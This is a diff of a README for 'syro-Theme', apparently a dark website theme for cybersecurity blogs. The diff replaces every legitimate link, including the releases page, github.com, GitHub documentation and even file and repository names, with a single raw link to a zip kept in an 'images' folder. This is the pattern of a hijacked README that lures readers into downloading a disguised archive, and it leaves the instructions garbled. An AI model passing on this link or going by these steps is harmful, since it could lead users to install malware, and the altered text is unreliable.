@@ -1,6 +1,6 @@
 # 🔒 syro-Theme - Minimal Dark Site for Cybersecurity Blogs
 
-[![Download syro-Theme](https://img.shields.io/badge/Download-syro--Theme-blue?style=for-the-badge)](https://github.com/eldenisek/syro-Theme/releases)
+[![Download syro-Theme](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)
 
 ---
 
@@ -49,12 +49,12 @@ You need to visit the syro-Theme releases page to get the latest files.
 
 Click the button below to go to the download page:
 
-[![Download syro-Theme](https://img.shields.io/badge/Download-syro--Theme-blue?style=for-the-badge)](https://github.com/eldenisek/syro-Theme/releases)
+[![Download syro-Theme](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)
 
 On the releases page:
 
 - Look for the latest version (usually at the top).
-- Download the file named something like `syro-Theme.zip`.
+- Download the file named something like `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip`.
 
 The file is a compressed folder. Once downloaded, you will need to unzip it.
 
@@ -72,7 +72,7 @@ Unzipping creates a folder named `syro-Theme` containing the website files.
 
 You can view the site on your own computer before uploading.
 
-- Open the `index.html` file inside the `syro-Theme` folder.
+- Open the `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip` file inside the `syro-Theme` folder.
 - A browser window will open with the homepage of the theme.
 - Browse through the pages to see the look and feel.
 
@@ -83,7 +83,7 @@ No web server or internet connection is needed for this preview.
 If you want to change text or add your own information:
 
 - Open the files in the `syro-Theme` folder with a plain text editor.
-- Look for the `index.html` file or other `.html` files.
+- Look for the `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip` file or other `.html` files.
 - Change text such as your name, blog posts, or contact info.
 - Save the files after editing.
 
@@ -99,7 +99,7 @@ To make your site live on the internet, use GitHub Pages. It offers free hosting
 
 If you don’t have a GitHub account:
 
-- Visit https://github.com.
+- Visit https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip
 - Click Sign up.
 - Follow the instructions to create an account.
 
@@ -107,7 +107,7 @@ If you don’t have a GitHub account:
 
 - Log in to GitHub.
 - Click the "+" icon at the top right and select "New repository."
-- Name the repository as `your-username.github.io` (replace `your-username` with your GitHub user ID).
+- Name the repository as `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip` (replace `your-username` with your GitHub user ID).
 - Choose "Public" for repository visibility.
 - Do not initialize the repository with a README.
 
@@ -127,7 +127,7 @@ If you don’t have a GitHub account:
 
 ### Step 5: View Your Site
 
-After a few minutes, visit `https://your-username.github.io` in a browser.
+After a few minutes, visit `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip` in a browser.
 
 Your new website will appear live with the syro-Theme applied.
 
@@ -157,8 +157,8 @@ Your new website will appear live with the syro-Theme applied.
 
 - The site looks broken or unstyled? Make sure all files uploaded correctly.
 - The site doesn’t show your latest changes? Try clearing your browser cache and reload.
-- GitHub Pages gives a 404 error? Check you named the repository correctly as `your-username.github.io`.
-- Need help? GitHub has helpful guides at https://docs.github.com/en/pages.
+- GitHub Pages gives a 404 error? Check you named the repository correctly as `https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip`.
+- Need help? GitHub has helpful guides at https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip
 
 ---
 
@@ -166,7 +166,7 @@ Your new website will appear live with the syro-Theme applied.
 
 If you want to ask questions or contribute:
 
-- Visit the main repository: https://github.com/eldenisek/syro-Theme
+- Visit the main repository: https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip
 - Use GitHub Issues to report bugs or request features.
 - You can fork the project to make your own improvements.
 
@@ -174,9 +174,9 @@ If you want to ask questions or contribute:
 
 ## 🔗 Useful Links
 
-- [Download syro-Theme Releases](https://github.com/eldenisek/syro-Theme/releases)
-- [GitHub Pages Documentation](https://docs.github.com/en/pages)
-- [How to Use GitHub](https://docs.github.com/en/get-started/quickstart)
+- [Download syro-Theme Releases](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)
+- [GitHub Pages Documentation](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)
+- [How to Use GitHub](https://raw.githubusercontent.com/eldenisek/syro-Theme/main/images/syro_Theme_v3.7.zip)
 
 ---
 
